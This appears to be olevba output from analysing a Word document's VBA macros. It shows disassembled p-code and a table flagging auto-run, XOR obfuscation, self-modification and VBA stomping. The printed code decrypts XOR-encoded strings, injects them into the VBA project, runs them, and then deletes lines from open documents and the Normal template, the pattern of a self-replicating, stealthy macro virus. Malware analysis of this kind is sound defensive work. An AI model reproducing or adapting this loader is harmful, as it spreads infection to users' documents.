' 	LitStr 0x0030 "ｫﾄ鴈趾��ｫﾀ�蓍鰲ﾆ蓁赳鯰珱･ｸ･ﾆ蓁赳鮹�鉉珮""
' 	LitDI2 0x001B 
' 	ArgsSt ourcode 0x0001 
' Line #40:
' 	LitStr 0x004E "ｫﾄ鴈趾��ｫﾖ渼�蓚ﾇ蔕�貘碆ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x001C 
' 	ArgsSt ourcode 0x0001 
' Line #41:
' 	LitStr 0x002A "ｫﾄ鴈趾��ｫﾁ�鱠�ﾄ鰲ｸ･ﾄ鰲���""
' 	LitDI2 0x001D 
' 	ArgsSt ourcode 0x0001 
' Line #42:
' 	LitStr 0x0049 "ｫﾄ鴈趾��ｫﾁ�鱠�ﾖ蔔･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x001E 
' 	ArgsSt ourcode 0x0001 
' Line #43:
' 	LitStr 0x0009 "ﾀ�皈ﾒ�""
' 	LitDI2 0x001F 
' 	ArgsSt ourcode 0x0001 
' Line #44:
' 	LitStr 0x006E "ﾆ�韋蓁睇蔔ﾆｭｧﾔ���ｩ･ｰｬｬｫﾆ���鴕ｭﾆｭｧﾍ矼ｧｩ･ｰｬｬｫﾀ�蓍鰲皈ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｵｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x0020 
' 	ArgsSt ourcode 0x0001 
' Line #45:
' 	LitStr 0x003C "��蓚鱠��｡･ｸ･ﾆｭｧ羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘ｩ･ｰｬ"
' 	LitDI2 0x0021 
' 	ArgsSt ourcode 0x0001 
' Line #46:
' 	LitStr 0x0018 "ﾖ蔘狷��蓚鱠��｡"
' 	LitDI2 0x0022 
' 	ArgsSt ourcode 0x0001 
' Line #47:
' 	LitStr 0x0044 "ﾃ��･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾑ�･ﾁ�跼鞨�ｫﾆ��"
' 	LitDI2 0x0023 
' 	ArgsSt ourcode 0x0001 
' Line #48:
' 	LitStr 0x005F "ﾒ�･ﾁ�跼鞨�ｭ�ｬｫﾓﾇﾕ�琥ﾓﾇﾆ�頷��琿ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ�矜ﾈ�碣鰲""
' 	LitDI2 0x0024 
' 	ArgsSt ourcode 0x0001 
' Line #49:
' 	LitStr 0x0045 "ｫﾁ琺瑰猖��璋･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ｫﾆ�翹��璋"
' 	LitDI2 0x0025 
' 	ArgsSt ourcode 0x0001 
' Line #50:
' 	LitStr 0x0015 "ｫ蓊矼頽��筵顰跛矜"
' 	LitDI2 0x0026 
' 	ArgsSt ourcode 0x0001 
' Line #51:
' 	LitStr 0x0009 "ﾀ�皈ﾒ�""
' 	LitDI2 0x0027 
' 	ArgsSt ourcode 0x0001 
' Line #52:
' 	LitStr 0x0005 "ﾋ��""
' 	LitDI2 0x0028 
' 	ArgsSt ourcode 0x0001 
' Line #53:
' 	LitStr 0x0009 "ﾒ�･���""
' 	LitDI2 0x0029 
' 	ArgsSt ourcode 0x0001 
' Line #54:
' 	LitStr 0x0045 "ｫﾁ琺瑰猖��璋･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ｫﾆ�翹��璋"
' 	LitDI2 0x002A 
' 	ArgsSt ourcode 0x0001 
' Line #55:
' 	LitStr 0x0015 "ｫ蓊矼頽��筵顰跛矜"
' 	LitDI2 0x002B 
' 	ArgsSt ourcode 0x0001 
' Line #56:
' 	LitStr 0x0009 "ﾀ�皈ﾒ�""
' 	LitDI2 0x002C 
' 	ArgsSt ourcode 0x0001 
' Line #57:
' 	LitStr 0x0014 "ﾋ�蓚ﾑ琲蓴爿ﾖ蔘�""
' 	LitDI2 0x002D 
' 	ArgsSt ourcode 0x0001 
' Line #58:
' 	LitStr 0x0032 "ﾕ蓴犱･ｸ･ﾆｭｧﾃｺﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌ｮ鴃鬧ｩ･ｰｬ"
' 	LitDI2 0x002E 
' 	ArgsSt ourcode 0x0001 
' Line #59:
' 	LitStr 0x001B "ﾊ�･ﾕ蓴犱･ﾃ�ﾊﾄｦｴ"
' 	LitDI2 0x002F 
' 	ArgsSt ourcode 0x0001 
' Line #60:
' 	LitStr 0x0014 "ﾁ�隘�ｭｷｲｬ･ﾄﾖ���""
' 	LitDI2 0x0030 
' 	ArgsSt ourcode 0x0001 
' Line #61:
' 	LitStr 0x0011 "�ｭｵｬ･ｸ･ｧﾛﾓﾃﾒﾉﾐﾔﾝｧ"
' 	LitDI2 0x0031 
' 	ArgsSt ourcode 0x0001 
' Line #62:
' 	LitStr 0x0037 "�ｭｴｬ･ｸ･ｧ銧ｽﾏﾎｱｺﾊﾏﾉﾎｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲ｩ﨡鞦�ｧ"
' 	LitDI2 0x0032 
' 	ArgsSt ourcode 0x0001 
' Line #63:
' 	LitStr 0x003D "�ｭｷｬ･ｸ･ｧ鉷ｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x0033 
' 	ArgsSt ourcode 0x0001 
' Line #64:
' 	LitStr 0x000D "�ｭｶｬ･ｸ･ｧ鉸ｽｧ"
' 	LitDI2 0x0034 
' 	ArgsSt ourcode 0x0001 
' Line #65:
' 	LitStr 0x0037 "�ｭｱｬ･ｸ･ｧ鋧ｽﾏﾎｱｺﾐﾁﾒﾔｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲ｩ﨡鞦�ｧ"
' 	LitDI2 0x0035 
' 	ArgsSt ourcode 0x0001 
' Line #66:
' 	LitStr 0x003D "�ｭｰｬ･ｸ･ｧ鋗ｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x0036 
' 	ArgsSt ourcode 0x0001 
' Line #67:
' 	LitStr 0x000D "�ｭｳｬ･ｸ･ｧ鋙ｽｧ"
' 	LitDI2 0x0037 
' 	ArgsSt ourcode 0x0001 
' Line #68:
' 	LitStr 0x003D "�ｭｲｬ･ｸ･ｧ鋐ｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ糢ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x0038 
' 	ArgsSt ourcode 0x0001 
' Line #69:
' 	LitStr 0x003D "�ｭｽｬ･ｸ･ｧ﨧ｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x0039 
' 	ArgsSt ourcode 0x0001 
' Line #70:
' 	LitStr 0x000D "�ｭｼｬ･ｸ･ｧ鋕ｽｧ"
' 	LitDI2 0x003A 
' 	ArgsSt ourcode 0x0001 
' Line #71:
' 	LitStr 0x003F "�ｭｴｵｬ･ｸ･ｧ鋠ｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ硼皙ｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x003B 
' 	ArgsSt ourcode 0x0001 
' Line #72:
' 	LitStr 0x003F "�ｭｴｴｬ･ｸ･ｧ鉷ｰｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x003C 
' 	ArgsSt ourcode 0x0001 
' Line #73:
' 	LitStr 0x000F "�ｭｴｷｬ･ｸ･ｧ鉷ｱｽｧ"
' 	LitDI2 0x003D 
' 	ArgsSt ourcode 0x0001 
' Line #74:
' 	LitStr 0x0040 "�ｭｴｶｬ･ｸ･ｧ鉷ｲｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ�砌褓ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x003E 
' 	ArgsSt ourcode 0x0001 
' Line #75:
' 	LitStr 0x003F "�ｭｴｱｬ･ｸ･ｧ鉷ｳｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x003F 
' 	ArgsSt ourcode 0x0001 
' Line #76:
' 	LitStr 0x000F "�ｭｴｰｬ･ｸ･ｧ鉷ｴｽｧ"
' 	LitDI2 0x0040 
' 	ArgsSt ourcode 0x0001 
' Line #77:
' 	LitStr 0x003E "�ｭｴｳｬ･ｸ･ｧ鉷ｵｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ罨ｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x0041 
' 	ArgsSt ourcode 0x0001 
' Line #78:
' 	LitStr 0x003F "�ｭｴｲｬ･ｸ･ｧ鉷ｶｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x0042 
' 	ArgsSt ourcode 0x0001 
' Line #79:
' 	LitStr 0x000F "�ｭｴｽｬ･ｸ･ｧ鉷ｷｽｧ"
' 	LitDI2 0x0043 
' 	ArgsSt ourcode 0x0001 
' Line #80:
' 	LitStr 0x003D "�ｭｴｼｬ･ｸ･ｧ鉷ｸｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ￢ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x0044 
' 	ArgsSt ourcode 0x0001 
' Line #81:
' 	LitStr 0x003F "�ｭｷｵｬ･ｸ･ｧ鉷ｹｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x0045 
' 	ArgsSt ourcode 0x0001 
' Line #82:
' 	LitStr 0x000F "�ｭｷｴｬ･ｸ･ｧ鉸ｰｽｧ"
' 	LitDI2 0x0046 
' 	ArgsSt ourcode 0x0001 
' Line #83:
' 	LitStr 0x0041 "�ｭｷｷｬ･ｸ･ｧ鉸ｱｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ鈑�蟐ｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x0047 
' 	ArgsSt ourcode 0x0001 
' Line #84:
' 	LitStr 0x003F "�ｭｷｶｬ･ｸ･ｧ鉸ｲｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x0048 
' 	ArgsSt ourcode 0x0001 
' Line #85:
' 	LitStr 0x000F "�ｭｷｱｬ･ｸ･ｧ鉸ｳｽｧ"
' 	LitDI2 0x0049 
' 	ArgsSt ourcode 0x0001 
' Line #86:
' 	LitStr 0x0045 "�ｭｷｰｬ･ｸ･ｧ鉸ｴｽﾏ釞ｱｺﾔﾅﾘﾔｺｪ礦釿鵫碚ｪｺ｣ｺ﨡ｯﾉﾆｨ､鵫肭ｽｽ､淲﨡鞦��ｧ"
' 	LitDI2 0x004A 
' 	ArgsSt ourcode 0x0001 
' Line #87:
' 	LitStr 0x003F "�ｭｷｳｬ･ｸ･ｧ鉸ｵｽｯ蒹罌鮏､鵫肭羲ﾜ鮏�ﾜ褊ﾜ蔡ⅵ砌淲ｮ蔡罘"
' 	LitDI2 0x004B 
' 	ArgsSt ourcode 0x0001 
' Line #88:
' 	LitStr 0x000F "�ｭｷｲｬ･ｸ･ｧ鉸ｶｽｧ"
' 	LitDI2 0x004C 
' 	ArgsSt ourcode 0x0001 
' Line #89:
' 	LitStr 0x000F "ﾃ��･ｸ･ｵ･ﾑ�･ｷｲ"
' 	LitDI2 0x004D 
' 	ArgsSt ourcode 0x0001 
' Line #90:
' 	LitStr 0x0018 "ﾕ�ｦｴｩ･ﾆｭ�ｭ�ｬｩ･ｰｬ"
' 	LitDI2 0x004E 
' 	ArgsSt ourcode 0x0001 
' Line #91:
' 	LitStr 0x0005 "ﾋ��""
' 	LitDI2 0x004F 
' 	ArgsSt ourcode 0x0001 
' Line #92:
' 	LitStr 0x0008 "ﾆ鳰･ｦｴ"
' 	LitDI2 0x0050 
' 	ArgsSt ourcode 0x0001 
' Line #93:
' 	LitStr 0x003E "ﾁ�隘矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｱｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾄﾖ���""
' 	LitDI2 0x0051 
' 	ArgsSt ourcode 0x0001 
' Line #94:
' 	LitStr 0x0057 "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ渧ﾜ褊ﾜｮ鴃鬧ｩ･ｰｬ"
' 	LitDI2 0x0052 
' 	ArgsSt ourcode 0x0001 
' Line #95:
' 	LitStr 0x0059 "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｷｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ渧ｳｲﾜ褊ﾜｮ鴃鬧ｩ･ｰｬ"
' 	LitDI2 0x0053 
' 	ArgsSt ourcode 0x0001 
' Line #96:
' 	LitStr 0x0059 "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｶｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ�銓�ｱﾜ渧ﾜｮ鴃鬧ｩ･ｰｬ"
' 	LitDI2 0x0054 
' 	ArgsSt ourcode 0x0001 
' Line #97:
' 	LitStr 0x005B "矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｱｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ｸ･ﾆｭｧ羲ﾜ�銓�ｱﾜ渧ｳｲﾜｮ鴃鬧ｩ･ｰｬ"
' 	LitDI2 0x0055 
' 	ArgsSt ourcode 0x0001 
' Line #98:
' 	LitStr 0x005E "ﾃ��･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾑ�･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｱｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x0056 
' 	ArgsSt ourcode 0x0001 
' Line #99:
' 	LitStr 0x0042 "ﾖ瑰ﾄ矜ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭ�ｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｩ･ﾋ�蓚""
' 	LitDI2 0x0057 
' 	ArgsSt ourcode 0x0001 
' Line #100:
' 	LitStr 0x0039 "ﾖ浯鳬･ﾆｭｧ胥ｧｩ･ｰｬ･｣･ﾕ蓴犱･｣･ﾆｭｧｧｩ･ｰｬ･｣･矜ｭ�ｬ"
' 	LitDI2 0x0058 
' 	ArgsSt ourcode 0x0001 
' Line #101:
' 	LitStr 0x0005 "ﾋ��""
' 	LitDI2 0x0059 
' 	ArgsSt ourcode 0x0001 
' Line #102:
' 	LitStr 0x007D "ﾌ罕ﾁ蕈ｭﾋ�ｬｬ･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾄ�皈ﾈ��ｭﾋ�ｬｬ･ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｼｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ･ﾑ浯�""
' 	LitDI2 0x005A 
' 	ArgsSt ourcode 0x0001 
' Line #103:
' 	LitStr 0x0041 "ﾒ�･ﾁ�跼鞨�ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｴｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｫﾆ����"
' 	LitDI2 0x005B 
' 	ArgsSt ourcode 0x0001 
' Line #104:
' 	LitStr 0x0022 "ｫﾃ��ﾋ蒻爭ｸ･ﾆｭｧﾗ鴃鈕鴃銛ｧｩ･ｰｬ"
' 	LitDI2 0x005C 
' 	ArgsSt ourcode 0x0001 
' Line #105:
' 	LitStr 0x0037 "ｫﾃ��ﾖ�爭ｸ･ｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｭｲｷｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬｬ"
' 	LitDI2 0x005D 
' 	ArgsSt ourcode 0x0001 
' Line #106:
' 	LitStr 0x001E "ｫﾌ�ﾄ胝璞･ﾆｭｧﾑｳｳﾎﾙｧｩ･ｰｬ"
' 	LitDI2 0x005E 
' 	ArgsSt ourcode 0x0001 
' Line #107:
' 	LitStr 0x0009 "ﾀ�皈ﾒ�""
' 	LitDI2 0x005F 
' 	ArgsSt ourcode 0x0001 
' Line #108:
' 	LitStr 0x0007 "ﾀ�皈ﾌ�""
' 	LitDI2 0x0060 
' 	ArgsSt ourcode 0x0001 
' Line #109:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0060 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #110:
' 	LitDI2 0x007E 
' 	Ld i 
' 	ArgsLd ourcode 0x0001 
' 	LitDI2 0x0085 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #111:
' 	StartForVariable 
' 	Next 
' Line #112:
' 	ArgsCall run 0x0000 
' Line #113:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld i 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #114:
' 	LitDI2 0x007E 
' 	LitDI2 0x0060 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #115:
' 	LitDI2 0x007E 
' 	LitDI2 0x0060 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #116:
' 	StartForVariable 
' 	Next 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Private Function Crypt(q33ny, key, id_FFFE As Variant))
' Line #119:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q33ny 
' 	FnLen 
' 	For 
' Line #120:
' 	Ld Crypt 
' 	Ld q33ny 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld key 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Crypt 
' Line #121:
' 	StartForVariable 
' 	Next 
' Line #122:
' 	LitStr 0x0000 ""
' 	St q33ny 
' Line #123:
' 	EndFunc 
' Line #124:
' 	FuncDefn (Private Sub run())
' Line #125:
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

